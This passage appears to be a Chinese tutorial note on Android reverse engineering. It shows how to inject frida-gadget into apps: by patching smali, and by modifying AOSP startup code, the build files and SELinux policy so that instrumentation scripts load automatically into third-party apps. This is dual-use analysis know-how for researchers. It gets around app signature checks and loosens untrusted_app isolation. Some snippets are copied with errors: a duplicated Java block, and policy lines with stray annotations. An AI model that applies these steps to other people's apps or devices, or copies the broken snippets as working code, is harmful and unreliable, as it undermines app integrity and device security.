href="http://xn--libfrida-gadget-n214a.so">把libfrida-gadget.so</a>(官网下载)文件放入lib文件下的某个arm文件夹中，在准备一个配置文件，<a href="http://libfrida-gadget.config.so">libfrida-gadget.config.so</a>，内容为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//脚本模式，加载这个js脚本</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;interaction&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;script&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/home/oleavr/explore.js&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//脚本模式，加载多个js脚本，放入一个目录中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;interaction&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;script-directory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/usr/local/frida/scripts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app如何加载这个libfrida-gadget.so呢？</p><p>所以我们要修改app代码(.dex文件)让原本app来加载这个so文件，在app入口添加如下代码：</p><p><img src="assets/image-20240131185225259.png" alt="image-20240131185225259"></p><p>smail形式为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#direct methods</span><br><span class="line">.<span class="property">method</span> <span class="keyword">static</span> constructor &lt;clinit&gt;()V</span><br><span class="line">.<span class="property">register</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">.<span class="property">prologue</span></span><br><span class="line"><span class="keyword">const</span>-string v0,<span class="string">&quot;frida-gadget&quot;</span></span><br><span class="line"></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;v0&#125;, <span class="title class_">Ljava</span>/lang/<span class="title class_">System</span>;-&gt;<span class="title function_">loadLibrary</span>(<span class="title class_">Ljava</span>/lang/<span class="title class_">String</span>;)V</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.<span class="property">end</span> method</span><br></pre></td></tr></table></figure><p>然后在进行回编译打包。</p><p>但是有些app验证签名或者不能重打包。</p><p>所以 <strong>魔改系统</strong></p><p>在app启动过程中，自动加载frida-gadget，更通用。</p><h2 id="修改app启动流程">修改app启动流程</h2><p>在安卓系统源码中的ActivityThread类下找handleBandApplication方法，在<code>app=data.info.makeApplication(data.restrictedBackupMode)</code>前面添加代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">curPkgName</span> <span class="operator">=</span> data.appInfo.packageName;   <span class="comment">//获取包名</span></span><br><span class="line"><span class="type">int</span> <span class="variable">curUid</span> <span class="operator">=</span> Process.myUid();</span><br><span class="line"><span class="keyword">if</span>(curUid&gt;<span class="number">10000</span>)&#123;                               <span class="comment">//系统app一般小于10000 过滤系统app</span></span><br><span class="line">    Persist.LOGD(); <span class="type">String</span> <span class="variable">curPkgName</span> <span class="operator">=</span> data.appInfo.packageName;</span><br><span class="line">        <span class="type">int</span> <span class="variable">curUid</span> <span class="operator">=</span> Process.myUid();</span><br><span class="line">        <span class="keyword">if</span> (curUid &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">            Persist.LOGD(<span class="string">&quot;curPkgName: &quot;</span> + curPkgName + <span class="string">&quot; curUid: &quot;</span> + curUid);</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">isPersist</span> <span class="operator">=</span> Persist.isEnablePersist(curPkgName);   <span class="comment">//是否注入fridagadget</span></span><br><span class="line">            Persist.LOGD(<span class="string">&quot;isPersist: &quot;</span> + isPersist);</span><br><span class="line">            <span class="keyword">if</span> (isPersist) &#123;</span><br><span class="line">                <span class="keyword">if</span>(Persist.doXiaojianbangPersist(appContext, curPkgName))&#123;  <span class="comment">//加载fridagadget</span></span><br><span class="line">                    Persist.LOGD(<span class="string">&quot;doXiaojianbangPersist is ok&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    Persist.LOGD(<span class="string">&quot;doXiaojianbangPersist failed&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义包和类">自定义包和类</h2><p>上面修改app流程的一些方法和Persist类是自定义的，将这个包导入安卓系统源码中的ActivityThread类，具体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaojianbang;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Persist</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SO_NAME</span> <span class="operator">=</span> <span class="string">&quot;libxiaojianbang.so&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SO_CONFIG_NAME</span> <span class="operator">=</span> <span class="string">&quot;libxiaojianbang.config.so&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LIB32_DIR</span> <span class="operator">=</span> <span class="string">&quot;/system/lib&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LIB64_DIR</span> <span class="operator">=</span> <span class="string">&quot;/system/lib64&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SETTINGS_DIR</span> <span class="operator">=</span> <span class="string">&quot;/data/system/xsettings/xiaojianbang/persist&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ENABLE_PERSIST_FILE_NAME</span> <span class="operator">=</span> <span class="string">&quot;xiaojianbang_persist&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_JS_DIR</span> <span class="operator">=</span> <span class="string">&quot;/data/system/xsettings/xiaojianbang/jscfg&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_JS_FILE_NAME</span> <span class="operator">=</span> <span class="string">&quot;config.js&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG_NAME</span> <span class="operator">=</span> <span class="string">&quot;xiaojianbang_persist&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">LOGD</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.d(TAG_NAME, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">saveFile</span><span class="params">(String filePath, String textMsg)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filePath);</span><br><span class="line">            fileOutputStream.write(textMsg.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">copyFile</span><span class="params">(File srcFile, File dstFile)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dstFile);</span><br><span class="line">            <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span> * <span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len = fileInputStream.read(data)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                fileOutputStream.write(data,<span class="number">0</span>, len);</span><br><span class="line">                fileOutputStream.flush();</span><br><span class="line">            &#125;</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断app是否打开自动注入脚本功能</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEnablePersist</span><span class="params">(String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断文件是否存在 /data/system/xsettings/xiaojianbang/persist/com.xiaojianbang.app/xiaojianbang_persist</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">enableFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(SETTINGS_DIR, pkgName + File.separator + ENABLE_PERSIST_FILE_NAME);</span><br><span class="line">        <span class="keyword">return</span> enableFile.exists();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取源JS文件路径</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">getConfigJSPath</span><span class="params">(String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// /data/system/xsettings/xiaojianbang/jscfg/com.xiaojianbang.app/config.js</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(CONFIG_JS_DIR, pkgName + File.separator + CONFIG_JS_FILE_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拷贝源JS文件到app私有目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">copyJSFile</span><span class="params">(Context context, String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断源JS文件是否存在</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcJSFile</span> <span class="operator">=</span> getConfigJSPath(pkgName);</span><br><span class="line">        <span class="keyword">if</span>(!srcJSFile.exists()) &#123;</span><br><span class="line">            LOGD(<span class="string">&quot;srcJSFile not exists&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 拷贝源JS文件到app私有目录</span></span><br><span class="line">        <span class="comment">// /data/data/com.xiaojianbang.app/files/config.js</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dstJSFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), CONFIG_JS_FILE_NAME);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isCopyJSOk</span> <span class="operator">=</span> copyFile(srcJSFile, dstJSFile);</span><br><span class="line">        <span class="keyword">if</span>(!isCopyJSOk)&#123;</span><br><span class="line">            LOGD(<span class="string">&quot;copyJSFile fail: &quot;</span> + srcJSFile + <span class="string">&quot; -&gt; &quot;</span> + dstJSFile);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dstJSFile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成Gadget配置文件</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">genGadgetConfig</span><span class="params">(Context context, File dstJSFile)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">childObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            childObj.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;script&quot;</span>);</span><br><span class="line">            childObj.put(<span class="string">&quot;path&quot;</span>, dstJSFile.toString());</span><br><span class="line">            jsonObject.put(<span class="string">&quot;interaction&quot;</span>, childObj);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">configFilePath</span> <span class="operator">=</span> context.getFilesDir() + File.separator + SO_CONFIG_NAME;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isSaveOk</span> <span class="operator">=</span> saveFile(configFilePath, jsonObject.toString());</span><br><span class="line">        <span class="keyword">if</span>(!isSaveOk)&#123;</span><br><span class="line">            LOGD(<span class="string">&quot;saveFile fail: &quot;</span> + configFilePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拷贝源so文件到app私有目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">copySoFile</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="comment">// 判断源so文件是否存在</span></span><br><span class="line">        <span class="comment">// /system/lib/libxiaojianbang.so   //与后面修改“handheld_system.mk”路径对应</span></span><br><span class="line">        <span class="comment">// /system/lib64/libxiaojianbang.so</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcSoFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(LIB32_DIR, SO_NAME);</span><br><span class="line">        <span class="keyword">if</span>(Process.is64Bit()) &#123;</span><br><span class="line">            srcSoFile = <span class="keyword">new</span> <span class="title class_">File</span>(LIB64_DIR, SO_NAME);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!srcSoFile.exists()) &#123;</span><br><span class="line">            LOGD(<span class="string">&quot;srcSoFile not exists&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 拷贝源so文件到app私有目录</span></span><br><span class="line">        <span class="comment">// /data/data/com.xiaojianbang.app/files/libxiaojianbang.so</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dstSoFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), SO_NAME);</span><br><span class="line">        <span class="keyword">if</span>(srcSoFile.length() != dstSoFile.length()) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isCopyFileOk</span> <span class="operator">=</span> copyFile(srcSoFile, dstSoFile);</span><br><span class="line">            <span class="keyword">if</span>(!isCopyFileOk)&#123;</span><br><span class="line">                LOGD(<span class="string">&quot;copySoFile fail: &quot;</span> + srcSoFile + <span class="string">&quot; -&gt; &quot;</span> + dstSoFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dstSoFile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 进行Frida Gadget持久化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">doXiaojianbangPersist</span><span class="params">(Context context, String pkgName)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dstJSFile</span> <span class="operator">=</span> copyJSFile(context, pkgName);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == dstJSFile) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!genGadgetConfig(context, dstJSFile)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dstSoFile</span> <span class="operator">=</span> copySoFile(context);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == dstSoFile) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        System.load(dstSoFile.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="将自定义包加入白名单">将自定义包加入白名单</h2><p>自定义包和类一般不会被编译，所以要加入白名单</p><p>白名单文件路径</p><p><code>/build/make/core/tasks/check_boot_jars/package_whitelist.txt</code></p><p>随便加入一个位置就可以</p><h2 id="frida-gadget集成到系统">frida-gadget集成到系统</h2><p>frida官网下载32位和64位frida-gadget，放在安卓系统源码<code>/frameworks/base/cmds/libxiaojianbang</code>下</p><p>修改源码以下文件<code>/build/make/target/product/handheld_system.mk</code>，将 frida-gadget 拷贝到编译以后的系统中</p><p>修改内容</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line">PRODUCT_COPY_FILES += \</span><br><span class="line">    frameworks<span class="keyword">/base/</span>cmds<span class="keyword">/xiaojianbang/</span>frida-gadget<span class="number">-14.2</span><span class="number">.18</span>-android-arm.so:$(TARGET_COPY_OUT_SYSTEM)<span class="keyword">/lib/</span>libxiaojianbang.so \</span><br><span class="line">    frameworks<span class="keyword">/base/</span>cmds<span class="keyword">/xiaojianbang/</span>frida-gadget<span class="number">-14.2</span><span class="number">.18</span>-android-arm64.so:$(TARGET_COPY_OUT_SYSTEM)<span class="keyword">/lib64/</span>libxiaojianbang.so</span><br><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line"></span><br><span class="line">这样就会把源码中的“<span class="keyword">/frameworks/</span>base<span class="keyword">/cmds/</span>libxiaojianbang”下的frida-gadget文件导入到系统目录下(具体导入的位置要和前面自定义类中写的存放fridagadget.so路径一致)</span><br></pre></td></tr></table></figure><h2 id="开机创建自定义目录">开机创建自定义目录</h2><p>在frida-gadget持久化的时候，讲师把.js文件gadget的配置文件等放入了自定义的目录下，为了防止每次刷机自己手动创建</p><p>所以在<code>/system/core/rootdir/init.rc 文件中添加以下数据 625</code>添加以下：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line">   <span class="meta"># /data/system/xsettings/xiaojianbang/persist</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang/jscfg <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="meta"># <span class="comment">// add</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="为自定义目录关联文件类型标签">为自定义目录关联文件类型标签</h2><p>1）创建文件类型SeLinux标签：xiaojianbang_file</p><p>在如下两个文件中/system/sepolicy/public/file.te，/system/sepolicy/prebuilts/api/29.0/public/file.te</p><p>添加数据 405</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"># /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist</span><br><span class="line">type xiaojianbang_file, file_type, data_file_type, core_data_file_type, mlstrustedobject;</span><br><span class="line"># <span class="comment">// add</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2）自定义目录关联文件类型标签: xiaojianbang_file</p><p>在如下两个文件中/system/sepolicy/private/file_contexts，/system/sepolicy/prebuilts/api/29.0/private/file_contexts</p><p>添加数据 122</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"># /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist</span><br><span class="line">/data/<span class="keyword">system</span>/xsettings(/.*)?u:object_r:xiaojianbang_file:s0</span><br><span class="line"># <span class="comment">// add</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置app访问标签文件权限">配置app访问标签文件权限</h2><p>1）配置system app访问 xiaojianbang_file 标签文件的权限</p><p>在如下文件中/system/sepolicy/private/system_app.te和/system/sepolicy/prebuilts/api/29.0/private/system_app.te</p><p>添加如下数据 (末尾)</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># // add</span></span><br><span class="line"><span class="comment"># add for accessing xiaojianbang_file</span></span><br><span class="line">allow system_app xiaojianbang_file:dir  &#123; getattr setattr <span class="keyword">open</span> <span class="keyword">read</span> <span class="keyword">write</span> remove_name create add_name search <span class="keyword">rmdir</span> &#125;;</span><br><span class="line">allow system_app xiaojianbang_file:file &#123; getattr setattr <span class="keyword">open</span> <span class="keyword">read</span> <span class="keyword">write</span> create <span class="keyword">unlink</span> &#125;;=</span><br></pre></td></tr></table></figure><p>2）配置第三方app访问 xiaojianbang_file 标签文件的权限</p><p>在如下文件中</p><p>/system/sepolicy/private/untrusted_app.te</p><p>/system/sepolicy/private/untrusted_app_25.te</p><p>/system/sepolicy/private/untrusted_app_27.te</p><p>/system/sepolicy/private/untrusted_app_all.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_25.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_27.te</p><p>/system/sepolicy/prebuilts/api/29.0/private/untrusted_app_all.te</p><p>添加如下数据(末尾)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">// add</span></span><br><span class="line"><span class="meta"># add for accessing xiaojianbang_file</span></span><br><span class="line"><span class="function">allow <span class="title">untrusted_app</span><span class="params">(与文件名要一致)</span> xiaojianbang_file:dir  &#123;</span> getattr open read write search rmdir &#125;;</span><br><span class="line">allow untrusted_app（与文件名要一致 xiaojianbang_file:file &#123; getattr open read write &#125;;</span><br></pre></td></tr></table></figure><h2 id="常见的编译错误">常见的编译错误</h2><p>1）修改以下文件，防止报错：标签xiaojianbang_file 未定义</p><p>/system/sepolicy/private/compat/26.0/26.0.ignore.cil 17</p><p>/system/sepolicy/private/compat/27.0/27.0.ignore.cil 